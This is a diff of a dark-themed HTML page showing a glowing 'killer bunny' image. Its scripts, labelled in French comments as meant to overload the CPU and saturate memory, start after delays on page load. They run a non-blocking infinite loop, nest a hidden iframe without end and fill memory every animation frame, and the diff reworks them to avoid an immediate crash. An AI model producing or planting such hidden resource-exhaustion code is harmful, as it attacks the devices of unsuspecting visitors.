@@ -3,22 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Your like Potatos ?</title>
+    <title>Lapin Tueur</title>
+    <style>
+        /* Thème sombre global */
+        body {
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(145deg, #000000, #1a1a1a);
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Conteneur principal */
+        .container {
+            text-align: center;
+            position: relative;
+        }
+
+        /* Style de l'image */
+        .killer-bunny {
+            width: 300px;
+            height: auto;
+            animation: fadeIn 2s ease-in-out;
+            filter: drop-shadow(0 0 20px rgba(255, 255, 255, 0.7)) drop-shadow(0 0 40px rgba(0, 0, 0, 0.5));
+            transition: transform 0.5s ease, filter 0.5s ease;
+        }
+
+        .killer-bunny:hover {
+            transform: scale(1.1);
+            filter: drop-shadow(0 0 40px rgba(255, 255, 255, 1)) drop-shadow(0 0 60px rgba(0, 0, 0, 0.7));
+        }
+
+        /* Animation de fade-in */
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.8);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        /* Effet brillant autour de l'image */
+        .glow {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 350px;
+            height: 350px;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.2), transparent);
+            border-radius: 50%;
+            z-index: -1;
+            animation: pulse 3s infinite ease-in-out;
+        }
+
+        /* Animation de pulsation */
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 0.5;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 1;
+                transform: scale(1.2);
+            }
+        }
+    </style>
 </head>
 <body>
-    <h1>Contact Ezio/ErrorNoName If you Like Potatos !! "nonameishere_" UwwUUUUUU</h1>
+    <div class="container">
+        <div class="glow"></div>
+        <img src="https://i.ibb.co/dMK3t7j/4328d00292b082b5f8fa1b648d25b666-removebg-preview.png" 
+             alt="Lapin Tueur" class="killer-bunny">
+    </div>
 
     <!-- Boucle Infinie JavaScript pour surcharger le CPU -->
     <script>
         setTimeout(function() {
-            while (true) {
-                console.log("Boucle Infinie...");
-            }
-        }, 5000); // Délai de 5 secondes avant de démarrer la boucle infinie pour permettre de charger le reste du site
+            let overload = true;
+            const infiniteLoop = () => {
+                if (overload) {
+                    console.log("Boucle Infinie...");
+                    setTimeout(infiniteLoop, 0); // Utilisation d'une pile non bloquante pour éviter un crash immédiat
+                }
+            };
+            infiniteLoop();
+        }, 5000); // Délai de 5 secondes avant de démarrer la boucle infinie
     </script>
 
     <!-- Iframes imbriquées à l'infini pour saturer la mémoire -->
-    <iframe id="nestedIframe" src="about:blank"></iframe>
+    <iframe id="nestedIframe" src="about:blank" style="display:none;"></iframe>
     <script>
         setTimeout(function() {
             const iframe = document.querySelector('#nestedIframe');
@@ -30,12 +112,16 @@
     <!-- Surcharge mémoire via objets non nettoyés -->
     <script>
         setTimeout(function() {
-            let a = [];
-            while (true) {
-                a.push({});
+            let memoryOverload = [];
+            const fillMemory = () => {
+                for (let i = 0; i < 10000; i++) {
+                    memoryOverload.push({});
+                }
                 console.log("Surcharge mémoire...");
-            }
-        }, 8000); // Délai de 8 secondes avant la surcharge mémoire pour combiner les effets
+                requestAnimationFrame(fillMemory); // Utilisation de requestAnimationFrame pour éviter un blocage immédiat
+            };
+            fillMemory();
+        }, 8000); // Délai de 8 secondes avant la surcharge mémoire
     </script>
 </body>
 </html>
